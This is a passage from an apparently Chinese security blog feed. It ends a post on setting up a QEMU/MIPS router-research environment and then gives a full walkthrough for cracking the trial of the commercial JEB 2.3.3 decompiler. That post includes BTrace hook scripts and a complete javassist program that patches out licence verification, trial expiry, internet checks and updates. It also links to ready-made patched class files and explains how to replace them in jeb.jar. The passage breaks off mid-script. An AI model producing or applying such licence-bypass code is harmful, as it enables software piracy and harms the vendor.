<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">auto lo </div><div class="line">iface lo inet loopback </div><div class="line"># ubuntu 16.04的系统用ens33代替eth0 </div><div class="line">auto eth0 </div><div class="line">iface eth0  inet manual </div><div class="line">up ifconfig eth0  0.0.0.0 up </div><div class="line">auto br0</div><div class="line">iface br0 inet dhcp </div><div class="line">bridge_ports eth0 </div><div class="line">bridge_stp off </div><div class="line">bridge_maxwait 1</div></pre></td></tr></table></figure>
<p>修改 <code>/etc/qemu-ifup</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#!/bin/sh </div><div class="line">echo &quot;Executing /etc/qemu-ifup&quot; </div><div class="line">echo &quot;Bringing $1 for bridged mode...&quot; </div><div class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up </div><div class="line">echo &quot;Adding $1 to br0...&quot; </div><div class="line">sudo /sbin/brctl addif br0 $1 </div><div class="line">sleep 3</div></pre></td></tr></table></figure></p>
<p>增加权限   <code>chmod a+x /etc/qemu-ifup</code></p>
<p>重启网络服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/networking restart</div></pre></td></tr></table></figure></p>
<p><strong>下载与运行qemu的镜像</strong></p>
<p><em>uclibc交叉编译工具链 和 qemu系统镜像</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.uclibc.org/downloads/binaries/0.9.30.1/</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150902839201120b9a6l3.png?imageslim" alt="paste image"></p>
<p><em>运行示例（解压，运行即可）</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo qemu-system-mips -M malta -nographic -no-reboot -kernel &quot;zImage-mips&quot; -hda &quot;image-mips.ext2&quot; -append &quot;root=/dev/hda rw init=/usr/sbin/init.sh panic=1 PATH=/usr/bin console=ttyS0&quot; -net nic -net tap -drive file=/tmp/share.img</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509028462257nom8v9ce.png?imageslim" alt="paste image"></p>
<p><em>openwrt预先编译好的内核，mips小端</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://downloads.openwrt.org/snapshots/trunk/malta/generic/</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509028533709dnukk3fx.png?imageslim" alt="paste image"><br><em>运行</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo qemu-system-mipsel -kernel openwrt-malta-le-vmlinux-initramfs.elf -M malta  -drive file=/tmp/share.img -net nic -net tap -nographic</div></pre></td></tr></table></figure></p>
<p> <em>debian mips qemu镜像 </em><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://people.debian.org/~aurel32/qemu/mips/</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509028870417m16zceue.png?imageslim" alt="paste image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap -nographic</div></pre></td></tr></table></figure>
<p>时间比较长<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090291042864rohh3lo.png?imageslim" alt="paste image"></p>
<h4 id="安装pwndbg"><a href="#安装pwndbg" class="headerlink" title="安装pwndbg"></a>安装pwndbg</h4><p>一个类似于 peda的gdb插件，支持多种架构，pwn最强gdb插件。用了它之后发现ida的调试简直渣渣。一张图说明一切。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090290758339f3u420n.png?imageslim" alt="paste image"><br>安装的话按照github上的说明即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/pwndbg/pwndbg</div></pre></td></tr></table></figure></p>
<p>要用来调试MIPS的话，要安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt install gdb-multiarch</div></pre></td></tr></table></figure></p>
<p>然后按照正常的gdb使用就行。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509029269607h15gm0sd.png?imageslim" alt="paste image"></p>
<h4 id="安装firmadyne"><a href="#安装firmadyne" class="headerlink" title="安装firmadyne"></a>安装firmadyne</h4><p>一个路由器运行环境，傻瓜化操作，但是无法调试……<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/firmadyne/firmadyne</div></pre></td></tr></table></figure></p>
<h4 id="安装mipsrop插件"><a href="#安装mipsrop插件" class="headerlink" title="安装mipsrop插件"></a>安装mipsrop插件</h4><p>貌似其他的rop工具都不能检测处mips的 gadgets,这个不错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/devttys0/ida/tree/master/plugins/mipsrop</div></pre></td></tr></table></figure></p>
<p>扔到ida的plug目录即可</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509029647708zje4hzns.png?imageslim" alt="paste image"></p>
<h4 id="安装-PleaseROP-插件"><a href="#安装-PleaseROP-插件" class="headerlink" title="安装 PleaseROP 插件"></a>安装 PleaseROP 插件</h4><p>jeb 2.3+ 的适用于arm , mips通用 rop gadgets搜索插件<br><a href="https://github.com/pnfsoftware/PleaseROP" target="_blank" rel="external">PleaseROP</a></p>
<p>下载后放到jeb根目录的 <code>coreplugins</code> 目录下，重新打开Jeb即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509090395335ni62umpx.png?imageslim" alt="paste image"></p>
<p>找到的结果可以在下面位置找到</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509090463437ew1n3zjs.png?imageslim" alt="paste image"></p>
<h4 id="binwalk完整安装"><a href="#binwalk完整安装" class="headerlink" title="binwalk完整安装"></a>binwalk完整安装</h4><p>一定要安装完整的版本不然有些固件解不了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://blog.csdn.net/qq1084283172/article/details/65441110</div></pre></td></tr></table></figure></p>
<h4 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h4><p>各种平台的静态编译版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/mzpqnxow/embedded-toolkit</div></pre></td></tr></table></figure></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>很简单，就这样</p>
<p>参考链接：</p>
<p><a href="http://blog.csdn.net/qq1084283172/article/details/70176583" target="_blank" rel="external">http://blog.csdn.net/qq1084283172/article/details/70176583</a></p>
<p>注：</p>
<p>&emsp;&emsp;本文先发布于：<a href="https://xianzhi.aliyun.com/forum/topic/1508/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1508/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
            <tag> 路由器安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java应用破解之破解 jeb mips 2.3.3 ]]></title>
      <url>/2017/10/23/crack_jeb_mips_2_3_3.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于要去学习路由器相关的漏洞利用技术的学习，而许多的路由器都是 <code>mips架构</code>  的，<code>IDA</code> 又不能反编译 <code>mips</code> , 发现 <code>jeb</code> 的新版支持 <code>mips的反编译</code> ，于是去官网申请一个试用版，试用版的限制还是比较多的，比如 <code>使用时间验证</code>，<code>没法复制粘贴</code> 等，于是想尝试看看能否破解，同时填了 <code>java破解</code> 这个坑。</p>
<hr>
<p>本文主要记录的是破解过程中的思路和使用的一些工具，技巧。文末有处理后的数据。</p>
<hr>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>  <code>jeb</code> 的主要逻辑在 <code>jeb.jar</code> 中，该文件会在程序运行起来后释放到程序目录中的其中一个子目录下，使用 <code>Everything</code> 搜 <code>jeb.jar</code> 就可以找到文件的位置。找到文件后就可以逆向分析了。本文重点不在逆向这方面，而是要介绍我破解这个软件的一个大概的流程。</p>
<p>  下面介绍几个在整个流程中起到重要作用的工具。</p>
<ul>
<li><code>Btrace</code>  —-&gt; hook java系统函数，打印堆栈，找关键方法</li>
<li><code>javassist</code> —-&gt;  修改字节码</li>
<li><code>IDEA</code> ——&gt;  动态调试jar包</li>
</ul>
<p>试用版的一个最无语的限制就是必须要联网才能使用，不联网就会直接退出了，就是如此暴力。但是这对我们来说则是绝佳的条件。我们可以使用 Btrace <code>hook java.lang.System.exit</code> 函数，然后打印堆栈信息，就可以定位到在退出前所调用的方法，一般来说，在方法之间肯定会有离关键方法很近的方法，或者直接就是我们要找的目标方法。<br>这个是之前破解的，现在我重新测试时，提示 <code>超过试用期</code>，然后就退出了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820496115nl8oskut.png?imageslim" alt="paste image"></p>
<p>不管怎样有异常就好，然后hook  <code>java.lang.System.exit</code> 打印堆栈信息就可以看到一些jeb自己写一些方法的的信息了。</p>
<p>Btrace脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import com.sun.btrace.annotations.*;  </div><div class="line">import static com.sun.btrace.BTraceUtils.*;  </div><div class="line"></div><div class="line">@BTrace</div><div class="line">public class TraceHelloWorld &#123;</div><div class="line">		@OnMethod</div><div class="line">		(clazz = &quot;java.lang.System&quot;, method = &quot;exit&quot;)</div><div class="line">		public static void Trace_exit()</div><div class="line">		&#123;</div><div class="line">			println( &quot;jstack() is :&quot; );</div><div class="line">			println( &quot;[&quot; );</div><div class="line">			jstack();</div><div class="line">			println( &quot;]&quot; );</div><div class="line">		&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820717781912l6lzi.png?imageslim" alt="paste image"></p>
<p>这里有个小问题,如果你是通过运行jeb_wincon.bat 或者 jeb.exe来启动jeb的话你是看不到他开启的 java进程的，所以可以使用 <code>everything</code> 搜索<code>org.eclipse.equinox.launcher*jar</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820877604x2xuse0y.png?imageslim" alt="paste image"></p>
<p>然后运行那个 jar 包就可以正常的找到 <code>jeb启动的 java 进程</code> 了，这样我们才可以使用 Btrace 脚本进行 hook. 至于为什么是这样的，我也不记得当初是怎样找到的。可以去逆向 <code>jeb.exe</code> 或者 看使用 <code>org.eclipse.equinox</code> 开发的教程可以弄清楚。其实通过 <code>Btrace</code> 然后配合着静态分析就可以解决这个软件了我认为。</p>
<p>Jeb里面会使用一个函数对字符串进行加密，所以在逆向的时候会很不方便，当初我是用 IDEA 调试它，然后 在 IDEA 的调试环境里面，调用解密函数(使用IDEA的自带的功能)，把加密后的字符串解密后，然后再分析的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15088226254701n26it6w.png?imageslim" alt="paste image"></p>
<p>使用IDEA调试其实非常简单，我们只需要先新建一个 project , 然后把相关的jar包添加到 Project 的 lib, 然后调用 jar 包中的函数即可。比如</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508821465891r2f5xrjy.png?imageslim" alt="paste image"></p>
<p>信息比较杂，看我画圈的那段代码即可。然后进入想要下断点的位置，正常的下个断点就可以了。</p>
<p>比如我们已经知道，程序权限校验的关键逻辑在 jeb.jar中，我们直接调用 jeb.jar中的 main 方法，然后进去调试里面的代码即可</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508821704636jxtite92.png?imageslim" alt="paste image"></p>
<p>赏心悦目的调试，美滋滋。分析或者调试 <code>jeb.jar</code> ，就可以找到 字符串加密的那个方法。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508822313678ssj9on8b.png?imageslim" alt="paste image"><br>如果没有目标，我们可以使用 Btrace hook 这个函数，打印他的返回值，就可以看到程序中各种被解密后的字符串了。脚本如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">import static com.sun.btrace.BTraceUtils.println;</div><div class="line">import static com.sun.btrace.BTraceUtils.str;</div><div class="line">import static com.sun.btrace.BTraceUtils.strcat;</div><div class="line">import static com.sun.btrace.BTraceUtils.timeMillis;</div><div class="line">import static com.sun.btrace.BTraceUtils.jstack;</div><div class="line"></div><div class="line"></div><div class="line">import com.sun.btrace.annotations.BTrace;</div><div class="line">import com.sun.btrace.annotations.Kind;</div><div class="line">import com.sun.btrace.annotations.Location;</div><div class="line">import com.sun.btrace.annotations.OnMethod;</div><div class="line"></div><div class="line">@BTrace</div><div class="line">public class TraceHelloWorld &#123;</div><div class="line">		@OnMethod</div><div class="line">		(clazz = &quot;com.pnfsoftware.jebglobal.GN&quot;, method = &quot;dL&quot;)</div><div class="line">		public static void Trace_exit()</div><div class="line">		&#123;</div><div class="line">			println( &quot;ret is :   &quot; );</div><div class="line">			println( &quot;[&quot; );</div><div class="line">			jstack();</div><div class="line">			println( &quot;]&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">		&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>经过各种翻看代码，调试， Hook, 终于找到一些可能是比较关键的函数，我们该怎么办呢？ 这时可以使用 <code>javassist</code> 来修改目标 方法。<br>比较懒，把破解 JEB 期间的所有代码都放到 一个 函数里面了，做了一定的注释。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div></pre></td><td class="code"><pre><div class="line">package me.hacklh;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.Launcher;</div><div class="line">import javassist.ClassPool;</div><div class="line">import javassist.CtClass;</div><div class="line">import javassist.CtMethod;</div><div class="line">import javassist.CtNewMethod;</div><div class="line">import com.pnfsoftware.jeb.installer.*;</div><div class="line">import org.eclipse.core.launcher.Main;</div><div class="line">import com.pnfsoftware.jeb.client.Licensing;</div><div class="line"></div><div class="line"></div><div class="line">public class JebCracker &#123;</div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception &#123;</div><div class="line"></div><div class="line">//        com.pnfsoftware.jeb.installer.Launcher.main(new String[]&#123;&quot;--di&quot;&#125;);</div><div class="line">//        DES.main(args);</div><div class="line">         Launcher.main(new String[]&#123;&quot;--generate-key&quot;&#125;);</div><div class="line">        CtClass.debugDump = &quot;./debugDump/&quot;;</div><div class="line"></div><div class="line">        System.out.println(Licensing.allowAnyClient());</div><div class="line"></div><div class="line">//        Main.main(args);</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 修改安装时的校验, 避免去下载网络安装文件，直接使用我们事先下好的文件就行</div><div class="line">         */</div><div class="line">        ClassPool pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.installer&quot;);</div><div class="line">        CtClass old_class = pool.get(&quot;com.pnfsoftware.jeb.installer.Package&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        CtMethod old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;verifyData&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(byte[].class.getName()),</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line">        /**</div><div class="line">         * 修改getStatus， AbstractContext会起几个线程修改status</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getStatus&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return 0;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;terminate&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * internet 检测</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jebglobal.tB&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jebglobal.tB&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;dL&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(boolean.class.getName()),</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;run&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 增加许可证的过期时间</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.Licensing&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.client.Licensing&quot;);</div><div class="line">        old_class.detach();</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getExpirationTimestamp&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return real_license_ts + 345600000;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;isInternetRequired&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return false;&quot;);</div><div class="line"></div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;isFullBuild&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;canUseCoreAPI&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;canUseCoreAPI&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * patch 掉与网络下载有关的函数，禁止升级</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;downloadBinary&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;httpPost&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(long[].class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行后会在工程目录生成一个文件夹，以你修改的类名为目录结构。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823032290g5jxwh19.png?imageslim" alt="paste image"></p>
<p>把这些 class文件替换到来的 jar 包里面就可了。<br>可以使用 winrar 把 jar 包打开，找到对应目录，拖进去替换就行了。<br>替换之后要去 META-INF 删掉一些东西。具体看下图</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823340258i9tfkhxn.png?imageslim" alt="paste image"></p>
<p>这样就完成了jar包的修改。<br>最后说下静态分析jar包的工具，使用 JEB 就可以。首先把jar 转换为 dex.</p>
<hr>
<p>dx.bat –dex –output=d:\dst.dex src.jar</p>
<hr>
<p>然后拿起jeb分析就行了。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>如果你看到了这里，并且按我前面所说的方式一步一步破解了jeb, 那么恭喜你和我一样被坑了。弄得差不多的时候，我发现有一个神奇的类。<br><code>com.pnfsoftware.jeb.client.Licensing</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823755460wqmsw9br.png?imageslim" alt="paste image"></p>
<p>瞬间爆炸，我们只要修改这里的函数的返回值，或者直接重写这个类，就可以基本搞定这款软件了。52破解上的  jeb 2.2.7 中延长使用时间 就是修改的这个类的方法（后面才看的，悲伤~~）</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823969930hxe2xs6n.png?imageslim" alt="paste image"></p>
<p>编译后 <a href="https://gitee.com/hac425/blog_data/blob/master/jeb_data.zip" target="_blank" rel="external">Class文件，点我</a> ，用它去替换jeb.jar中的相应文件即可,具体替换方法，文中有介绍。</p>
<p>分析过程的一些笔记<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">2.3.3</div><div class="line">com.pnfsoftware.jebglobal.cF  用于获取serial, uuid 生成字符串</div><div class="line">  .At---&gt; get uuid  </div><div class="line">  .GQ----&gt; get serial number   </div><div class="line">  .dL------&gt;     get_md5、</div><div class="line">com.pnfsoftware.jebglobal.eI  sC方法会检测运行时间，定时退出  校验运行时间  patch</div><div class="line">com.pnfsoftware.jeb.client.Licensing    licensing 校验   ， 修改该类的方法的返回值可以拿到大量的结果</div><div class="line">com.pnfsoftware.jebglobal.Wr                        重要函数，程序初始化， 保存功能</div></pre></td></tr></table></figure></p>
<p>分析过程中的另外的 Btrace脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">/* BTrace Script Template */  </div><div class="line">import com.sun.btrace.annotations.*;  </div><div class="line">import static 